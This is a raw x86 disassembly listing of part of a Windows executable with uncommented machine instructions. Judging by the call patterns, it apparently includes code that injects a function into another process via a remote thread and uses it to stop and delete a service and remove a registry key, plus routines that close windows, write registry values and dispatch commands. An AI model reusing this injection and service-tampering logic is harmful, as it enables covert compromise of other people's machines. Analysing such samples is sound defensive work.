  405219:	68 20 e2 40 00       	push   $0x40e220
  40521e:	56                   	push   %esi
  40521f:	c7 44 24 40 44 00 00 	movl   $0x44,0x40(%esp)
  405226:	00 
  405227:	c7 44 24 48 6c e1 40 	movl   $0x40e16c,0x48(%esp)
  40522e:	00 
  40522f:	ff 15 0c b1 40 00    	call   *0x40b10c
  405235:	f7 d8                	neg    %eax
  405237:	1b c0                	sbb    %eax,%eax
  405239:	5f                   	pop    %edi
  40523a:	f7 d8                	neg    %eax
  40523c:	5e                   	pop    %esi
  40523d:	83 c4 54             	add    $0x54,%esp
  405240:	c3                   	ret
  405241:	90                   	nop
  405242:	90                   	nop
  405243:	90                   	nop
  405244:	90                   	nop
  405245:	90                   	nop
  405246:	90                   	nop
  405247:	90                   	nop
  405248:	90                   	nop
  405249:	90                   	nop
  40524a:	90                   	nop
  40524b:	90                   	nop
  40524c:	90                   	nop
  40524d:	90                   	nop
  40524e:	90                   	nop
  40524f:	90                   	nop
  405250:	81 ec 60 01 00 00    	sub    $0x160,%esp
  405256:	83 c9 ff             	or     $0xffffffff,%ecx
  405259:	33 c0                	xor    %eax,%eax
  40525b:	56                   	push   %esi
  40525c:	8b b4 24 68 01 00 00 	mov    0x168(%esp),%esi
  405263:	57                   	push   %edi
  405264:	8b fe                	mov    %esi,%edi
  405266:	f2 ae                	repnz scas %es:(%edi),%al
  405268:	f7 d1                	not    %ecx
  40526a:	49                   	dec    %ecx
  40526b:	0f 84 d4 00 00 00    	je     0x405345
  405271:	b9 41 00 00 00       	mov    $0x41,%ecx
  405276:	8d 7c 24 64          	lea    0x64(%esp),%edi
  40527a:	f3 ab                	rep stos %eax,%es:(%edi)
  40527c:	8d 44 24 08          	lea    0x8(%esp),%eax
  405280:	c7 44 24 0c 04 01 00 	movl   $0x104,0xc(%esp)
  405287:	00 
  405288:	50                   	push   %eax
  405289:	68 3f 00 0f 00       	push   $0xf003f
  40528e:	6a 00                	push   $0x0
  405290:	68 30 e2 40 00       	push   $0x40e230
  405295:	68 00 00 00 80       	push   $0x80000000
  40529a:	ff 15 14 b0 40 00    	call   *0x40b014
  4052a0:	85 c0                	test   %eax,%eax
  4052a2:	0f 85 9d 00 00 00    	jne    0x405345
  4052a8:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4052ac:	8d 54 24 64          	lea    0x64(%esp),%edx
  4052b0:	51                   	push   %ecx
  4052b1:	52                   	push   %edx
  4052b2:	50                   	push   %eax
  4052b3:	8b 44 24 14          	mov    0x14(%esp),%eax
  4052b7:	50                   	push   %eax
  4052b8:	ff 15 38 b0 40 00    	call   *0x40b038
  4052be:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4052c2:	51                   	push   %ecx
  4052c3:	ff 15 34 b0 40 00    	call   *0x40b034
  4052c9:	8d 54 24 64          	lea    0x64(%esp),%edx
  4052cd:	52                   	push   %edx
  4052ce:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  4052d4:	85 c0                	test   %eax,%eax
  4052d6:	74 6d                	je     0x405345
  4052d8:	8d 44 24 64          	lea    0x64(%esp),%eax
  4052dc:	68 80 e1 40 00       	push   $0x40e180
  4052e1:	50                   	push   %eax
  4052e2:	ff 15 50 b2 40 00    	call   *0x40b250
  4052e8:	83 c4 08             	add    $0x8,%esp
  4052eb:	85 c0                	test   %eax,%eax
  4052ed:	74 56                	je     0x405345
  4052ef:	56                   	push   %esi
  4052f0:	50                   	push   %eax
  4052f1:	ff 15 d4 b0 40 00    	call   *0x40b0d4
  4052f7:	b9 10 00 00 00       	mov    $0x10,%ecx
  4052fc:	33 c0                	xor    %eax,%eax
  4052fe:	8d 7c 24 24          	lea    0x24(%esp),%edi
  405302:	f3 ab                	rep stos %eax,%es:(%edi)
  405304:	8b 84 24 70 01 00 00 	mov    0x170(%esp),%eax
  40530b:	c7 44 24 20 44 00 00 	movl   $0x44,0x20(%esp)
  405312:	00 
  405313:	85 c0                	test   %eax,%eax
  405315:	74 08                	je     0x40531f
  405317:	c7 44 24 28 6c e1 40 	movl   $0x40e16c,0x28(%esp)
  40531e:	00 
  40531f:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  405323:	8d 54 24 20          	lea    0x20(%esp),%edx
  405327:	51                   	push   %ecx
  405328:	52                   	push   %edx
  405329:	6a 00                	push   $0x0
  40532b:	6a 00                	push   $0x0
  40532d:	6a 00                	push   $0x0
  40532f:	6a 00                	push   $0x0
  405331:	6a 00                	push   $0x0
  405333:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  40533a:	6a 00                	push   $0x0
  40533c:	50                   	push   %eax
  40533d:	6a 00                	push   $0x0
  40533f:	ff 15 0c b1 40 00    	call   *0x40b10c
  405345:	5f                   	pop    %edi
  405346:	32 c0                	xor    %al,%al
  405348:	5e                   	pop    %esi
  405349:	81 c4 60 01 00 00    	add    $0x160,%esp
  40534f:	c3                   	ret
  405350:	83 ec 10             	sub    $0x10,%esp
  405353:	53                   	push   %ebx
  405354:	8b 1d 64 b0 40 00    	mov    0x40b064,%ebx
  40535a:	55                   	push   %ebp
  40535b:	8b 2d 68 b0 40 00    	mov    0x40b068,%ebp
  405361:	56                   	push   %esi
  405362:	57                   	push   %edi
  405363:	c7 44 24 14 74 e2 40 	movl   $0x40e274,0x14(%esp)
  40536a:	00 
  40536b:	c7 44 24 18 68 e2 40 	movl   $0x40e268,0x18(%esp)
  405372:	00 
  405373:	c7 44 24 1c 60 e2 40 	movl   $0x40e260,0x1c(%esp)
  40537a:	00 
  40537b:	8d 7c 24 14          	lea    0x14(%esp),%edi
  40537f:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%esp)
  405386:	00 
  405387:	8b 07                	mov    (%edi),%eax
  405389:	50                   	push   %eax
  40538a:	6a 00                	push   $0x0
  40538c:	ff d3                	call   *%ebx
  40538e:	8b f0                	mov    %eax,%esi
  405390:	85 f6                	test   %esi,%esi
  405392:	74 0c                	je     0x4053a0
  405394:	6a 00                	push   $0x0
  405396:	56                   	push   %esi
  405397:	ff d5                	call   *%ebp
  405399:	56                   	push   %esi
  40539a:	ff 15 6c b0 40 00    	call   *0x40b06c
  4053a0:	8b 44 24 10          	mov    0x10(%esp),%eax
  4053a4:	83 c7 04             	add    $0x4,%edi
  4053a7:	48                   	dec    %eax
  4053a8:	89 44 24 10          	mov    %eax,0x10(%esp)
  4053ac:	75 d9                	jne    0x405387
  4053ae:	5f                   	pop    %edi
  4053af:	5e                   	pop    %esi
  4053b0:	5d                   	pop    %ebp
  4053b1:	5b                   	pop    %ebx
  4053b2:	83 c4 10             	add    $0x10,%esp
  4053b5:	c3                   	ret
  4053b6:	90                   	nop
  4053b7:	90                   	nop
  4053b8:	90                   	nop
  4053b9:	90                   	nop
  4053ba:	90                   	nop
  4053bb:	90                   	nop
  4053bc:	90                   	nop
  4053bd:	90                   	nop
  4053be:	90                   	nop
  4053bf:	90                   	nop
  4053c0:	81 ec 00 04 00 00    	sub    $0x400,%esp
  4053c6:	b9 00 01 00 00       	mov    $0x100,%ecx
  4053cb:	33 c0                	xor    %eax,%eax
  4053cd:	56                   	push   %esi
  4053ce:	57                   	push   %edi
  4053cf:	8d 7c 24 08          	lea    0x8(%esp),%edi
  4053d3:	f3 ab                	rep stos %eax,%es:(%edi)
  4053d5:	8b 84 24 0c 04 00 00 	mov    0x40c(%esp),%eax
  4053dc:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4053e0:	50                   	push   %eax
  4053e1:	68 c4 e1 40 00       	push   $0x40e1c4
  4053e6:	51                   	push   %ecx
  4053e7:	ff 15 78 b3 40 00    	call   *0x40b378
  4053ed:	8b b4 24 1c 04 00 00 	mov    0x41c(%esp),%esi
  4053f4:	83 c4 0c             	add    $0xc,%esp
  4053f7:	6a 00                	push   $0x0
  4053f9:	56                   	push   %esi
  4053fa:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  405400:	50                   	push   %eax
  405401:	56                   	push   %esi
  405402:	6a 01                	push   $0x1
  405404:	8d 54 24 18          	lea    0x18(%esp),%edx
  405408:	68 80 e2 40 00       	push   $0x40e280
  40540d:	52                   	push   %edx
  40540e:	68 02 00 00 80       	push   $0x80000002
  405413:	e8 f8 10 00 00       	call   0x406510
  405418:	83 c4 1c             	add    $0x1c,%esp
  40541b:	5f                   	pop    %edi
  40541c:	5e                   	pop    %esi
  40541d:	81 c4 00 04 00 00    	add    $0x400,%esp
  405423:	c3                   	ret
  405424:	90                   	nop
  405425:	90                   	nop
  405426:	90                   	nop
  405427:	90                   	nop
  405428:	90                   	nop
  405429:	90                   	nop
  40542a:	90                   	nop
  40542b:	90                   	nop
  40542c:	90                   	nop
  40542d:	90                   	nop
  40542e:	90                   	nop
  40542f:	90                   	nop
  405430:	83 ec 1c             	sub    $0x1c,%esp
  405433:	8d 44 24 00          	lea    0x0(%esp),%eax
  405437:	50                   	push   %eax
  405438:	6a 28                	push   $0x28
  40543a:	ff 15 5c b1 40 00    	call   *0x40b15c
  405440:	50                   	push   %eax
  405441:	ff 15 58 b0 40 00    	call   *0x40b058
  405447:	85 c0                	test   %eax,%eax
  405449:	75 06                	jne    0x405451
  40544b:	32 c0                	xor    %al,%al
  40544d:	83 c4 1c             	add    $0x1c,%esp
  405450:	c3                   	ret
  405451:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  405455:	51                   	push   %ecx
  405456:	68 88 e2 40 00       	push   $0x40e288
  40545b:	6a 00                	push   $0x0
  40545d:	ff 15 5c b0 40 00    	call   *0x40b05c
  405463:	85 c0                	test   %eax,%eax
  405465:	75 11                	jne    0x405478
  405467:	8b 54 24 00          	mov    0x0(%esp),%edx
  40546b:	52                   	push   %edx
  40546c:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  405472:	32 c0                	xor    %al,%al
  405474:	83 c4 1c             	add    $0x1c,%esp
  405477:	c3                   	ret
  405478:	8b 44 24 04          	mov    0x4(%esp),%eax
  40547c:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  405480:	6a 00                	push   $0x0
  405482:	6a 00                	push   $0x0
  405484:	8d 54 24 14          	lea    0x14(%esp),%edx
  405488:	89 44 24 18          	mov    %eax,0x18(%esp)
  40548c:	8b 44 24 08          	mov    0x8(%esp),%eax
  405490:	6a 10                	push   $0x10
  405492:	52                   	push   %edx
  405493:	6a 00                	push   $0x0
  405495:	50                   	push   %eax
  405496:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  40549d:	00 
  40549e:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  4054a2:	c7 44 24 30 02 00 00 	movl   $0x2,0x30(%esp)
  4054a9:	00 
  4054aa:	ff 15 60 b0 40 00    	call   *0x40b060
  4054b0:	85 c0                	test   %eax,%eax
  4054b2:	75 11                	jne    0x4054c5
  4054b4:	8b 4c 24 00          	mov    0x0(%esp),%ecx
  4054b8:	51                   	push   %ecx
  4054b9:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  4054bf:	32 c0                	xor    %al,%al
  4054c1:	83 c4 1c             	add    $0x1c,%esp
  4054c4:	c3                   	ret
  4054c5:	8b 54 24 00          	mov    0x0(%esp),%edx
  4054c9:	52                   	push   %edx
  4054ca:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  4054d0:	b0 01                	mov    $0x1,%al
  4054d2:	83 c4 1c             	add    $0x1c,%esp
  4054d5:	c3                   	ret
  4054d6:	90                   	nop
  4054d7:	90                   	nop
  4054d8:	90                   	nop
  4054d9:	90                   	nop
  4054da:	90                   	nop
  4054db:	90                   	nop
  4054dc:	90                   	nop
  4054dd:	90                   	nop
  4054de:	90                   	nop
  4054df:	90                   	nop
  4054e0:	83 ec 1c             	sub    $0x1c,%esp
  4054e3:	53                   	push   %ebx
  4054e4:	56                   	push   %esi
  4054e5:	8b 74 24 28          	mov    0x28(%esp),%esi
  4054e9:	57                   	push   %edi
  4054ea:	6a 02                	push   $0x2
  4054ec:	6a 00                	push   $0x0
  4054ee:	6a 00                	push   $0x0
  4054f0:	ff 16                	call   *(%esi)
  4054f2:	8b d8                	mov    %eax,%ebx
  4054f4:	8d 46 2c             	lea    0x2c(%esi),%eax
  4054f7:	68 ff 01 0f 00       	push   $0xf01ff
  4054fc:	50                   	push   %eax
  4054fd:	53                   	push   %ebx
  4054fe:	ff 56 04             	call   *0x4(%esi)
  405501:	85 db                	test   %ebx,%ebx
  405503:	8b f8                	mov    %eax,%edi
  405505:	75 10                	jne    0x405517
  405507:	85 ff                	test   %edi,%edi
  405509:	75 0c                	jne    0x405517
  40550b:	5f                   	pop    %edi
  40550c:	5e                   	pop    %esi
  40550d:	83 c8 ff             	or     $0xffffffff,%eax
  405510:	5b                   	pop    %ebx
  405511:	83 c4 1c             	add    $0x1c,%esp
  405514:	c2 04 00             	ret    $0x4
  405517:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40551b:	51                   	push   %ecx
  40551c:	57                   	push   %edi
  40551d:	ff 56 08             	call   *0x8(%esi)
  405520:	85 c0                	test   %eax,%eax
  405522:	75 0c                	jne    0x405530
  405524:	5f                   	pop    %edi
  405525:	5e                   	pop    %esi
  405526:	83 c8 ff             	or     $0xffffffff,%eax
  405529:	5b                   	pop    %ebx
  40552a:	83 c4 1c             	add    $0x1c,%esp
  40552d:	c2 04 00             	ret    $0x4
  405530:	83 7c 24 10 01       	cmpl   $0x1,0x10(%esp)
  405535:	74 23                	je     0x40555a
  405537:	8d 54 24 0c          	lea    0xc(%esp),%edx
  40553b:	52                   	push   %edx
  40553c:	6a 01                	push   $0x1
  40553e:	57                   	push   %edi
  40553f:	ff 56 0c             	call   *0xc(%esi)
  405542:	85 c0                	test   %eax,%eax
  405544:	75 0c                	jne    0x405552
  405546:	5f                   	pop    %edi
  405547:	5e                   	pop    %esi
  405548:	83 c8 ff             	or     $0xffffffff,%eax
  40554b:	5b                   	pop    %ebx
  40554c:	83 c4 1c             	add    $0x1c,%esp
  40554f:	c2 04 00             	ret    $0x4
  405552:	68 e8 03 00 00       	push   $0x3e8
  405557:	ff 56 24             	call   *0x24(%esi)
  40555a:	57                   	push   %edi
  40555b:	ff 56 14             	call   *0x14(%esi)
  40555e:	8d 86 90 00 00 00    	lea    0x90(%esi),%eax
  405564:	50                   	push   %eax
  405565:	68 02 00 00 80       	push   $0x80000002
  40556a:	ff 56 1c             	call   *0x1c(%esi)
  40556d:	85 ff                	test   %edi,%edi
  40556f:	74 04                	je     0x405575
  405571:	57                   	push   %edi
  405572:	ff 56 18             	call   *0x18(%esi)
  405575:	85 db                	test   %ebx,%ebx
  405577:	74 04                	je     0x40557d
  405579:	53                   	push   %ebx
  40557a:	ff 56 18             	call   *0x18(%esi)
  40557d:	5f                   	pop    %edi
  40557e:	5e                   	pop    %esi
  40557f:	33 c0                	xor    %eax,%eax
  405581:	5b                   	pop    %ebx
  405582:	83 c4 1c             	add    $0x1c,%esp
  405585:	c2 04 00             	ret    $0x4
  405588:	90                   	nop
  405589:	90                   	nop
  40558a:	90                   	nop
  40558b:	90                   	nop
  40558c:	90                   	nop
  40558d:	90                   	nop
  40558e:	90                   	nop
  40558f:	90                   	nop
  405590:	81 ec f8 00 00 00    	sub    $0xf8,%esp
  405596:	53                   	push   %ebx
  405597:	55                   	push   %ebp
  405598:	56                   	push   %esi
  405599:	57                   	push   %edi
  40559a:	e8 91 fe ff ff       	call   0x405430
  40559f:	8b 84 24 0c 01 00 00 	mov    0x10c(%esp),%eax
  4055a6:	50                   	push   %eax
  4055a7:	e8 44 40 00 00       	call   0x4095f0
  4055ac:	83 c4 04             	add    $0x4,%esp
  4055af:	50                   	push   %eax
  4055b0:	6a 00                	push   $0x0
  4055b2:	68 ff 0f 1f 00       	push   $0x1f0fff
  4055b7:	ff 15 6c b1 40 00    	call   *0x40b16c
  4055bd:	85 c0                	test   %eax,%eax
  4055bf:	89 44 24 10          	mov    %eax,0x10(%esp)
  4055c3:	75 0d                	jne    0x4055d2
  4055c5:	5f                   	pop    %edi
  4055c6:	5e                   	pop    %esi
  4055c7:	5d                   	pop    %ebp
  4055c8:	32 c0                	xor    %al,%al
  4055ca:	5b                   	pop    %ebx
  4055cb:	81 c4 f8 00 00 00    	add    $0xf8,%esp
  4055d1:	c3                   	ret
  4055d2:	8b 1d e4 b0 40 00    	mov    0x40b0e4,%ebx
  4055d8:	b9 3d 00 00 00       	mov    $0x3d,%ecx
  4055dd:	33 c0                	xor    %eax,%eax
  4055df:	8d 7c 24 14          	lea    0x14(%esp),%edi
  4055e3:	f3 ab                	rep stos %eax,%es:(%edi)
  4055e5:	68 08 e1 40 00       	push   $0x40e108
  4055ea:	ff d3                	call   *%ebx
  4055ec:	8b 35 e0 b0 40 00    	mov    0x40b0e0,%esi
  4055f2:	8b f8                	mov    %eax,%edi
  4055f4:	68 44 e3 40 00       	push   $0x40e344
  4055f9:	57                   	push   %edi
  4055fa:	ff d6                	call   *%esi
  4055fc:	68 34 e3 40 00       	push   $0x40e334
  405601:	57                   	push   %edi
  405602:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  405606:	ff d6                	call   *%esi
  405608:	68 20 e3 40 00       	push   $0x40e320
  40560d:	57                   	push   %edi
  40560e:	89 44 24 20          	mov    %eax,0x20(%esp)
  405612:	ff d6                	call   *%esi
  405614:	68 10 e3 40 00       	push   $0x40e310
  405619:	57                   	push   %edi
  40561a:	89 44 24 24          	mov    %eax,0x24(%esp)
  40561e:	ff d6                	call   *%esi
  405620:	68 00 e3 40 00       	push   $0x40e300
  405625:	57                   	push   %edi
  405626:	89 44 24 28          	mov    %eax,0x28(%esp)
  40562a:	ff d6                	call   *%esi
  40562c:	68 f0 e2 40 00       	push   $0x40e2f0
  405631:	57                   	push   %edi
  405632:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  405636:	ff d6                	call   *%esi
  405638:	68 dc e2 40 00       	push   $0x40e2dc
  40563d:	57                   	push   %edi
  40563e:	89 44 24 30          	mov    %eax,0x30(%esp)
  405642:	ff d6                	call   *%esi
  405644:	8b 2d dc b0 40 00    	mov    0x40b0dc,%ebp
  40564a:	57                   	push   %edi
  40564b:	89 44 24 30          	mov    %eax,0x30(%esp)
  40564f:	ff d5                	call   *%ebp
  405651:	68 d0 e2 40 00       	push   $0x40e2d0
  405656:	ff d3                	call   *%ebx
  405658:	8b f8                	mov    %eax,%edi
  40565a:	68 c0 e2 40 00       	push   $0x40e2c0
  40565f:	57                   	push   %edi
  405660:	ff d6                	call   *%esi
  405662:	57                   	push   %edi
  405663:	89 44 24 34          	mov    %eax,0x34(%esp)
  405667:	ff d5                	call   *%ebp
  405669:	68 b0 e2 40 00       	push   $0x40e2b0
  40566e:	ff d3                	call   *%ebx
  405670:	8b f8                	mov    %eax,%edi
  405672:	68 a8 e2 40 00       	push   $0x40e2a8
  405677:	57                   	push   %edi
  405678:	ff d6                	call   *%esi
  40567a:	68 9c e2 40 00       	push   $0x40e29c
  40567f:	57                   	push   %edi
  405680:	89 44 24 40          	mov    %eax,0x40(%esp)
  405684:	ff d6                	call   *%esi
  405686:	57                   	push   %edi
  405687:	89 44 24 38          	mov    %eax,0x38(%esp)
  40568b:	ff d5                	call   *%ebp
  40568d:	8b 8c 24 10 01 00 00 	mov    0x110(%esp),%ecx
  405694:	8b 35 d4 b0 40 00    	mov    0x40b0d4,%esi
  40569a:	8d 54 24 40          	lea    0x40(%esp),%edx
  40569e:	51                   	push   %ecx
  40569f:	52                   	push   %edx
  4056a0:	ff d6                	call   *%esi
  4056a2:	8d 84 24 a4 00 00 00 	lea    0xa4(%esp),%eax
  4056a9:	68 ec e1 40 00       	push   $0x40e1ec
  4056ae:	50                   	push   %eax
  4056af:	ff d6                	call   *%esi
  4056b1:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  4056b5:	8d 94 24 a4 00 00 00 	lea    0xa4(%esp),%edx
  4056bc:	51                   	push   %ecx
  4056bd:	52                   	push   %edx
  4056be:	ff 15 d0 b0 40 00    	call   *0x40b0d0
  4056c4:	6a 04                	push   $0x4
  4056c6:	68 00 10 00 00       	push   $0x1000
  4056cb:	68 f4 00 00 00       	push   $0xf4
  4056d0:	6a 00                	push   $0x0
  4056d2:	8b 74 24 20          	mov    0x20(%esp),%esi
  4056d6:	8b 1d 68 b1 40 00    	mov    0x40b168,%ebx
  4056dc:	56                   	push   %esi
  4056dd:	ff d3                	call   *%ebx
  4056df:	8b f8                	mov    %eax,%edi
  4056e1:	85 ff                	test   %edi,%edi
  4056e3:	75 0d                	jne    0x4056f2
  4056e5:	5f                   	pop    %edi
  4056e6:	5e                   	pop    %esi
  4056e7:	5d                   	pop    %ebp
  4056e8:	32 c0                	xor    %al,%al
  4056ea:	5b                   	pop    %ebx
  4056eb:	81 c4 f8 00 00 00    	add    $0xf8,%esp
  4056f1:	c3                   	ret
  4056f2:	8b 2d 64 b1 40 00    	mov    0x40b164,%ebp
  4056f8:	6a 00                	push   $0x0
  4056fa:	8d 44 24 18          	lea    0x18(%esp),%eax
  4056fe:	68 f4 00 00 00       	push   $0xf4
  405703:	50                   	push   %eax
  405704:	57                   	push   %edi
  405705:	56                   	push   %esi
  405706:	ff d5                	call   *%ebp
  405708:	85 c0                	test   %eax,%eax
  40570a:	75 0d                	jne    0x405719
  40570c:	5f                   	pop    %edi
  40570d:	5e                   	pop    %esi
  40570e:	5d                   	pop    %ebp
  40570f:	32 c0                	xor    %al,%al
  405711:	5b                   	pop    %ebx
  405712:	81 c4 f8 00 00 00    	add    $0xf8,%esp
  405718:	c3                   	ret
  405719:	6a 40                	push   $0x40
  40571b:	68 00 10 00 00       	push   $0x1000
  405720:	68 00 28 00 00       	push   $0x2800
  405725:	6a 00                	push   $0x0
  405727:	56                   	push   %esi
  405728:	ff d3                	call   *%ebx
  40572a:	8b d8                	mov    %eax,%ebx
  40572c:	85 db                	test   %ebx,%ebx
  40572e:	75 0d                	jne    0x40573d
  405730:	5f                   	pop    %edi
  405731:	5e                   	pop    %esi
  405732:	5d                   	pop    %ebp
  405733:	32 c0                	xor    %al,%al
  405735:	5b                   	pop    %ebx
  405736:	81 c4 f8 00 00 00    	add    $0xf8,%esp
  40573c:	c3                   	ret
  40573d:	6a 00                	push   $0x0
  40573f:	68 00 28 00 00       	push   $0x2800
  405744:	68 e0 54 40 00       	push   $0x4054e0
  405749:	53                   	push   %ebx
  40574a:	56                   	push   %esi
  40574b:	ff d5                	call   *%ebp
  40574d:	85 c0                	test   %eax,%eax
  40574f:	75 0d                	jne    0x40575e
  405751:	5f                   	pop    %edi
  405752:	5e                   	pop    %esi
  405753:	5d                   	pop    %ebp
  405754:	32 c0                	xor    %al,%al
  405756:	5b                   	pop    %ebx
  405757:	81 c4 f8 00 00 00    	add    $0xf8,%esp
  40575d:	c3                   	ret
  40575e:	6a 00                	push   $0x0
  405760:	6a 00                	push   $0x0
  405762:	57                   	push   %edi
  405763:	53                   	push   %ebx
  405764:	6a 00                	push   $0x0
  405766:	6a 00                	push   $0x0
  405768:	56                   	push   %esi
  405769:	ff 15 60 b1 40 00    	call   *0x40b160
  40576f:	5f                   	pop    %edi
  405770:	5e                   	pop    %esi
  405771:	85 c0                	test   %eax,%eax
  405773:	5d                   	pop    %ebp
  405774:	5b                   	pop    %ebx
  405775:	0f 95 c0             	setne  %al
  405778:	81 c4 f8 00 00 00    	add    $0xf8,%esp
  40577e:	c3                   	ret
  40577f:	90                   	nop
  405780:	8b 44 24 04          	mov    0x4(%esp),%eax
  405784:	56                   	push   %esi
  405785:	57                   	push   %edi
  405786:	8b f1                	mov    %ecx,%esi
  405788:	50                   	push   %eax
  405789:	e8 92 07 00 00       	call   0x405f20
  40578e:	8b 44 24 10          	mov    0x10(%esp),%eax
  405792:	8b 3d d4 b0 40 00    	mov    0x40b0d4,%edi
  405798:	85 c0                	test   %eax,%eax
  40579a:	c7 06 94 b4 40 00    	movl   $0x40b494,(%esi)
  4057a0:	74 07                	je     0x4057a9
  4057a2:	8d 4e 10             	lea    0x10(%esi),%ecx
  4057a5:	50                   	push   %eax
  4057a6:	51                   	push   %ecx
  4057a7:	ff d7                	call   *%edi
  4057a9:	8b 44 24 18          	mov    0x18(%esp),%eax
  4057ad:	85 c0                	test   %eax,%eax
  4057af:	74 0a                	je     0x4057bb
  4057b1:	8d 96 10 01 00 00    	lea    0x110(%esi),%edx
  4057b7:	50                   	push   %eax
  4057b8:	52                   	push   %edx
  4057b9:	ff d7                	call   *%edi
  4057bb:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4057bf:	85 c0                	test   %eax,%eax
  4057c1:	74 08                	je     0x4057cb
  4057c3:	50                   	push   %eax
  4057c4:	68 30 e7 40 00       	push   $0x40e730
  4057c9:	ff d7                	call   *%edi
  4057cb:	8b 44 24 20          	mov    0x20(%esp),%eax
  4057cf:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4057d3:	a3 10 e2 40 00       	mov    %eax,0x40e210
  4057d8:	89 8e 54 9e 00 00    	mov    %ecx,0x9e54(%esi)
  4057de:	c7 86 50 9e 00 00 00 	movl   $0x0,0x9e50(%esi)
  4057e5:	00 00 00 
  4057e8:	c6 86 58 9e 00 00 00 	movb   $0x0,0x9e58(%esi)
  4057ef:	8b c6                	mov    %esi,%eax
  4057f1:	5f                   	pop    %edi
  4057f2:	5e                   	pop    %esi
  4057f3:	c2 18 00             	ret    $0x18
  4057f6:	90                   	nop
  4057f7:	90                   	nop
  4057f8:	90                   	nop
  4057f9:	90                   	nop
  4057fa:	90                   	nop
  4057fb:	90                   	nop
  4057fc:	90                   	nop
  4057fd:	90                   	nop
  4057fe:	90                   	nop
  4057ff:	90                   	nop
  405800:	56                   	push   %esi
  405801:	8b f1                	mov    %ecx,%esi
  405803:	e8 18 00 00 00       	call   0x405820
  405808:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40580d:	74 09                	je     0x405818
  40580f:	56                   	push   %esi
  405810:	e8 d1 4e 00 00       	call   0x40a6e6
  405815:	83 c4 04             	add    $0x4,%esp
  405818:	8b c6                	mov    %esi,%eax
  40581a:	5e                   	pop    %esi
  40581b:	c2 04 00             	ret    $0x4
  40581e:	90                   	nop
  40581f:	90                   	nop
  405820:	53                   	push   %ebx
  405821:	8b d9                	mov    %ecx,%ebx
  405823:	57                   	push   %edi
  405824:	33 ff                	xor    %edi,%edi
  405826:	8b 83 50 9e 00 00    	mov    0x9e50(%ebx),%eax
  40582c:	c7 03 94 b4 40 00    	movl   $0x40b494,(%ebx)
  405832:	85 c0                	test   %eax,%eax
  405834:	76 2e                	jbe    0x405864
  405836:	55                   	push   %ebp
  405837:	8b 2d e0 b1 40 00    	mov    0x40b1e0,%ebp
  40583d:	56                   	push   %esi
  40583e:	8d b3 10 02 00 00    	lea    0x210(%ebx),%esi
  405844:	8b 06                	mov    (%esi),%eax
  405846:	6a ff                	push   $0xffffffff
  405848:	50                   	push   %eax
  405849:	ff d5                	call   *%ebp
  40584b:	8b 0e                	mov    (%esi),%ecx
  40584d:	51                   	push   %ecx
  40584e:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  405854:	8b 83 50 9e 00 00    	mov    0x9e50(%ebx),%eax
  40585a:	47                   	inc    %edi
  40585b:	83 c6 04             	add    $0x4,%esi
  40585e:	3b f8                	cmp    %eax,%edi
  405860:	72 e2                	jb     0x405844
  405862:	5e                   	pop    %esi
  405863:	5d                   	pop    %ebp
  405864:	8b cb                	mov    %ebx,%ecx
  405866:	e8 05 07 00 00       	call   0x405f70
  40586b:	5f                   	pop    %edi
  40586c:	5b                   	pop    %ebx
  40586d:	c3                   	ret
  40586e:	90                   	nop
  40586f:	90                   	nop
  405870:	8b 44 24 04          	mov    0x4(%esp),%eax
  405874:	56                   	push   %esi
  405875:	8b f1                	mov    %ecx,%esi
  405877:	33 c9                	xor    %ecx,%ecx
  405879:	8a 08                	mov    (%eax),%cl
  40587b:	49                   	dec    %ecx
  40587c:	83 f9 2f             	cmp    $0x2f,%ecx
  40587f:	0f 87 7c 01 00 00    	ja     0x405a01
  405885:	33 d2                	xor    %edx,%edx
  405887:	8a 91 48 5a 40 00    	mov    0x405a48(%ecx),%dl
  40588d:	ff 24 95 08 5a 40 00 	jmp    *0x405a08(,%edx,4)
  405894:	8b 46 04             	mov    0x4(%esi),%eax
  405897:	6a 00                	push   $0x0
  405899:	6a 00                	push   $0x0
  40589b:	6a 00                	push   $0x0
  40589d:	8b 88 a8 00 00 00    	mov    0xa8(%eax),%ecx
  4058a3:	51                   	push   %ecx
  4058a4:	68 e0 4a 40 00       	push   $0x404ae0
  4058a9:	e9 88 00 00 00       	jmp    0x405936
  4058ae:	8b 46 04             	mov    0x4(%esi),%eax
  4058b1:	6a 01                	push   $0x1
  4058b3:	6a 00                	push   $0x0
  4058b5:	6a 00                	push   $0x0
  4058b7:	8b 88 a8 00 00 00    	mov    0xa8(%eax),%ecx
  4058bd:	51                   	push   %ecx
  4058be:	68 a0 4c 40 00       	push   $0x404ca0
  4058c3:	eb 71                	jmp    0x405936
  4058c5:	8b 46 04             	mov    0x4(%esi),%eax
  4058c8:	6a 00                	push   $0x0
  4058ca:	6a 00                	push   $0x0
  4058cc:	6a 00                	push   $0x0
  4058ce:	8b 88 a8 00 00 00    	mov    0xa8(%eax),%ecx
  4058d4:	51                   	push   %ecx
  4058d5:	68 80 4d 40 00       	push   $0x404d80
  4058da:	eb 5a                	jmp    0x405936
  4058dc:	8b 46 04             	mov    0x4(%esi),%eax
  4058df:	6a 00                	push   $0x0
  4058e1:	6a 00                	push   $0x0
  4058e3:	6a 00                	push   $0x0
  4058e5:	8b 88 a8 00 00 00    	mov    0xa8(%eax),%ecx
  4058eb:	51                   	push   %ecx
  4058ec:	68 60 4e 40 00       	push   $0x404e60
